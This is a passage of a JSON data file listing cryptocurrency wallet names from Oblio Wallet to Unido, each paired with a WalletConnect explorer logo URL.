        "name": "Oblio Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a0ff2932-e049-4622-a9c8-fa41278cff00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Obvious",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fe1b9394-55af-4828-a70d-5c5b7de6b200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "OISY",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fd94d14c-c6a0-47a9-498a-e6df95e50f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Okse Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8a1b36d5-7f40-403a-7000-5d30f9181200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Okto",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/154c69b7-9bb1-4010-5b4c-6b37eeda8900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "OKX Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c55df831-3c52-49fc-d1d1-97a926dc0c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Omni",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2cd67b4c-282b-4809-e7c0-a88cd5116f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "OneKey",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2067c771-93e8-4b32-b388-b2a0e1d4dc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "onewallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/49a8ef2d-fa6f-43d2-09d8-c63b3704d400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ONTO",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/14934596-632e-4b29-d45f-61109e959000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Open Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/68a3c433-d944-4bf6-5093-4ac415fd5400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Opera Crypto Browser",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/877fa1a4-304d-4d45-ca8e-f76d1a556f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Opto Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3df102e4-e435-49dd-d4b1-5ea74ebed500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "OPZ Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/bb347024-46c1-4be1-dd1f-98e6c51f8600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Orion",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/85007828-9522-4517-6a55-6f376de8a500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "OverFlex",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ac442ec8-206d-4885-41dc-005aa94bc500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "OWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/68489978-9f79-47f4-fd59-86a29df9bf00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ownbit",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/19923b08-7208-4539-9c2d-c43db22bce00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Oxalus Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a6e22fcb-6b69-45d2-b52d-a4a347a21e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Pali Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4672cbde-0f96-42f3-84a0-524e9ad70a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Pandoshi Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d5be0305-ff38-4412-6089-a94c2e445300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Paper",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/37d7a10f-d94d-4a56-c30e-267e8afbd500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Para",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9cbb5cba-cc30-4be6-33a2-9d77fca05100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ParaSwap Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/73dc6b30-b644-46e6-020c-5926851df600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Pass App",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d098fb77-70ae-4230-3059-3623ba048100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "PassPay Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a1c337f5-c156-4ce8-763b-b4cc65f1c200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "PayBolt",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/cc8f4e0c-56a8-465a-6cb6-3e9d60846500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Payperless",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4a867e30-44c9-4627-6281-33457b8e2100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "PEAKDEFI",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/918006e2-2f6d-4233-0e72-10c2caaed500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Phantom",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b6ec7b81-bb4f-427d-e290-7631e6e50d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "pier",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/cf3f0da1-40ec-4940-aebe-df075513d100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Pillar",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/87737170-f79f-4359-338b-7c30856c9f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Pintu",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b9c5dfd6-ca26-46c2-bc79-bc2570495800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "PioneWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d3ab5013-f497-4857-d169-4e666db89a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Pitaka",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c816aeae-e0d1-4c52-f37a-efde6df1ee00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Plasma Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c268e78d-ffb0-4c8b-5cad-04c3add48500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Plena-App",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9ba07b43-3db1-4e8d-100e-8c91d8430c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "PLTwallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a5d9dd15-8cef-42de-8bed-09e01a8b0200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Plumaa ID",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/dd6271ac-f9ba-4580-4db2-484bf4d0fc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Plutope",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/77aab1ef-28e8-4473-b91a-a566fd910900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "pockie",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a761beae-1e7e-4402-bcc5-a896a92bfb00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "poolswallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1bd15c9e-cd7c-48e2-af7d-47fda2236600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "PortaWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/07bc52e6-c402-439d-faea-a5736cd25300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "PREMA Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6487869b-1165-4f30-aa3a-115665be8300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "PrettyGood Keyboard",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ae26de70-87f2-4dea-d5ce-dcdb1a442400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Pundi Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f095abd7-575e-4851-cf9c-79c2c4e4cc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "PureWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ea64c6aa-13aa-440f-f503-0013acb37800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "PureWallet app",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4e97b9d6-60eb-42cd-6256-5cd7205e3f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Puzzle Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/08cb0a68-6271-4e25-90c3-bcc3c0226a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "QubeticsWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f6afe67c-41e9-44fc-075a-3e7eda291000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Qubic Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/535c91a5-a43c-4104-233c-439449ffcd00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "R0AR Mobile Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a8239b76-9877-4809-c29e-d1392b6f4e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Rabby",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/255e6ba2-8dfd-43ad-e88e-57cbb98f6800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Rainbow",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7a33d7f1-3d12-4b5c-f3ee-5cd83cb1b500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Rakuten Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a7b5c4b1-8b55-4b6c-af68-4b2786480600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "React Native Sample Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/78bbcc97-c450-4685-5faa-276ef8fc5f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ready",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/00ba080d-fb0a-4a31-940e-f75388500500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Renegade",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6ce2caa3-c597-445a-b61f-0b46b5c15000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Reown Wallet [BETA]",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e22669e7-5789-4ee4-5bf7-96dcddffce00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Reunit",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/98ed357f-1e2d-4679-0e78-1100f7594000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Revelator Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2027dfea-316d-474a-1c7d-08dead7b4200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Rezor",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0239b3e4-2c96-4045-d7f1-390a1ffc7e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "RiceWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/df94578e-19be-4f00-258f-2470343e7b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ripio Portal",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fd56c695-ce58-4df5-1625-767571c80700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Roam",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a4500b0c-47e3-4c4a-207e-d72a57f1ca00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Robinhood Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/dfe0e3e3-5746-4e2b-12ad-704608531500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ronin Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/bd78de7e-36da-4552-ebdd-2e420ba05900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Rovi Money",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b4bd79a6-11e3-4391-fd60-70111e60ef00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "rss wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/920c743d-950f-4d53-64ec-d342e272e500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "RYIPAY",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2f0918f7-f135-4b62-4765-ac183f14e500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SA ASSISTANT",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7954b508-9ff0-4416-9aba-16209b571000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Saakuru All-in-One crypto App",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/bb9120f9-9757-4aae-0378-3e4dc2f82100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Sabay Wallet App",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c4df7014-abaf-4016-8180-fb994804b400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Safe",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3913df81-63c2-4413-d60b-8ff83cbed500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Safe App Syscoin",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0b6b29ca-10a4-44cc-a51e-baa4b49fc300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SafeMoon",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ea0140c7-787c-43a4-838f-d5ab6a342000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SafePal",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/252753e7-b783-4e03-7f77-d39864530900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SafeWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c4f43408-612b-4777-c9d6-a022934ce600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Sahal Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/afa1e46a-331a-418f-ef1f-a29f76def100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Saify",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/83e459aa-7e2c-45cf-1c6c-c71286f34c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SaitaPro",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fedd85cd-fa5e-4c66-0b05-1ff2ce864e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Sample",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/171f0822-acf5-4eba-4392-a2d16db90400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ScramberryWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2398a924-62b4-4f64-4a59-7ae7a293ce00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Scramble",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c00ef3da-aacb-4c27-66ae-3cb9537a4800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SecuX",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/98183be0-3125-45ee-a6b6-fbd47ebefd00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Sequel Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0c89b2e4-a0cc-4bfc-e3f5-398f4711af00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Sequence Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/221e7ee6-3445-4b4f-fd07-6e089de81f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ShapeShift",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/957c34b2-7210-475a-0734-689dfcabc400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SheFi",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a1a909e8-526b-4452-8788-5bb21e2b9e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Shido App",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/673b4fdc-8c65-41e0-d0f8-c2eb6c8e5500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ShimmerSea",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2e97da0b-225a-44c2-2e72-9125d8504a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Shinobi-Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/685c986c-3e80-4701-cec6-cd247ba1a700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Shyft Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0753fccd-eceb-4d89-b708-79fc9be6a900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Silk",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f11f5753-616a-4aa0-2aee-9b75befea700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Sinohope",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/06d056b9-aba7-453c-ddaf-a077a448ea00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Sinum",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/560d5efa-3fd1-4ac4-9229-f720395ab500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SISTEMAS",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/eda865c8-746b-4536-9d57-7d7de0555400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Smart.Baby",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7f408502-e3d1-48f1-a81f-654a3f338f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SmartRush",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/330df9c4-66c2-4306-1ca1-09b4c9921800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Socios.com - Wallet & Tokens",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/eb55679f-9462-45e2-e0ec-dfb851f9e700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Solace",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4bb93c92-f20b-41d7-97c7-d0e74100bd00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Solflare",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/34c0e38d-66c4-470e-1aed-a6fabe2d1e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Solutions Team Test",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/63048851-38f9-4a58-880e-65d404dcf300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SoulSwap",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/24fc6e6e-a276-4c95-fa77-91ec1097d600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Spatium",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8b966926-cdcf-4eae-1432-b400fe014700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Spot On Chain App",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1bcb5ed6-f6c9-4b0d-f891-b70c48b93d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Squirrel Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2d96f461-ff40-4118-ef09-810c45376200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SSP",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e0c01e64-5cb1-4458-c8b7-afae64fb4c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Stablez",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/345a0491-91fb-4282-316b-8db8d2010200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Stasis Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d83223cf-f29a-4757-a21e-8913b12f9f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Status",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1e5fb93a-3a0a-40b9-8a86-b14a775aae00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Stickey Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/12aab9fb-f3d4-4248-10e0-4eda17a5de00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Streakk Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/45ec6eb9-d7fe-4b9b-6dbf-cc675c5d1d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "StrikeX Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f81642e4-2355-454a-25f5-72e27f2c6f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SubWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/03f5c08c-fb30-46a0-ca5c-d8fdd7250b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Superhero Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7a8f1546-765c-4b96-e73b-0c07457e3400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SuperWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e8f30122-5537-4b38-d6d5-9cae46771800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Swift Sample Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d4ef1a64-f5e3-4f11-9fe0-035e22ca6200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "SWOP",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6e773b07-efcc-40eb-b3a2-300efc5df800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "T+ Wallet ",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c08ff28f-5a52-4bf2-e63a-205905fd5800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Taho",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/13416950-f73f-4a4c-2f22-d494ed5df800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Talisman Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ba290222-c3f3-4194-23bf-28ba7587af00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Talken Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3c49e8e7-a4d8-4810-23ef-0a0102cce100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Tangem Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/80679c6f-bb0b-43d0-83e0-462ac268b600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "tastycrypto",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/357878c9-a195-4102-8f69-55eb2c578700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Tellaw Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c1cb03f5-e1c2-4c3e-86e1-9a90565ea300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "The Pulse Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1f3d46b8-2569-4601-5084-845f7e64da00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Theta Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d4afb810-5925-4f00-4ebb-d180fcf29000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "thirdweb",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c8d820ec-54fb-4c0e-210e-5cbbf92e1000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Tholos",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f0f306e6-2dba-4805-e7b9-4f25952e2900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "THORWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/45165bea-fdae-454e-7caa-31681f255200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Tidus Wallet ",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/797bd108-d862-4d1b-d339-883de9a75000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Timeless Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/32e89601-0490-42fc-0cc4-8627d62a2000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Timeless X",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/92f1ead4-0bc4-4932-10d3-761c509b4d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Tofee Wallet Official",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d4dbb723-b1ec-4cfc-daab-1d559a151f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "TokenPocket",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/cfe00608-cb9e-45e3-0d08-5ffc7f5ad200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Tokoin | My-T Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/88a2518c-16c2-4ee3-4699-1a1c6903bc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "tomi Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e0592a0e-1909-4a73-7955-2dbf9caac200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Tomo Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/95c9f957-b1e4-4619-fa7c-a77569d2fe00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Torus",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1caa462e-dcf5-4c56-d180-094c81444f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Trezor Suite",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3816cd81-6f38-4fa1-7900-f451a1727300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Trust Asset Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f64fabc5-1e3f-4ad4-7362-747abd1bc000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Trust Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7677b54f-3486-46e2-4e37-bf8747814f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Trustee Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9870dc31-9eb2-4f7c-3ebf-9ead998e9b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "TrustKeys Web3 SocialFi",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/35644c6b-c6f3-4e45-b68b-e888c21afd00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "TuCOP Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2d38bfd6-85dc-41b5-a125-a0eca4100200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "U2U Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/03bca3fc-c191-4877-592d-0b0d6557c900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "UIIC",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/cdd77592-c1ba-4dc2-f2a6-c454e2c19800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ultimate",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1ed9823d-64dd-4ab6-2f3f-22c8ff228f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "una Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/78118aa8-8dfc-4742-86f7-b51d34e7cf00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Uniblow",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3aa86daa-b885-4686-c443-83355e1b3b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Unido",
